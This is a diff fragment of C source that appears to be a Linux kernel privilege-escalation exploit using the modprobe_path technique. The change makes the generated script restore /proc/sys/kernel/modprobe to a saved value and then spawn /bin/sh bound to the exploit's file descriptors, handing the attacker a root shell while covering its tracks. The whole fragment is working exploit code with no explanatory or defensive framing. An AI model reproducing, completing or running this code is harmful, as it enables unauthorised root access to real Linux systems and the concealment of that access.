@@ -71,7 +71,7 @@ void trigger_modprobe_sock(void)
 	}
 }
 
-int prepare_privesc_script(char *path, size_t path_size)
+int prepare_privesc_script(char *path, size_t path_size, char *modprobe_path)
 {
 	pid_t pid = getpid();
 	int script_fd = -1;
@@ -97,8 +97,12 @@ int prepare_privesc_script(char *path, size_t path_size)
 		return EXIT_FAILURE;
 	}
 
-	ret = dprintf(script_fd, "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n", pid,
-		      shell_stdin_fd, pid, shell_stdout_fd);
+	ret = dprintf(script_fd,
+		      "#!/bin/sh\n"
+		      "echo \"%s\" > /proc/sys/kernel/modprobe\n"
+		      "/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n",
+		      modprobe_path, pid, shell_stdin_fd, pid, shell_stdout_fd);
+
 	if (ret < 0) {
 		perror("[-] dprintf for privesc_script");
 		return EXIT_FAILURE;
@@ -223,7 +227,8 @@ int main(void)
 	if (ret == EXIT_FAILURE)
 		goto end;
 
-	ret = prepare_privesc_script(privesc_script_path, sizeof(privesc_script_path));
+	ret = prepare_privesc_script(privesc_script_path, sizeof(privesc_script_path),
+				     modprobe_path);
 	if (ret == EXIT_FAILURE)
 		goto end;
 
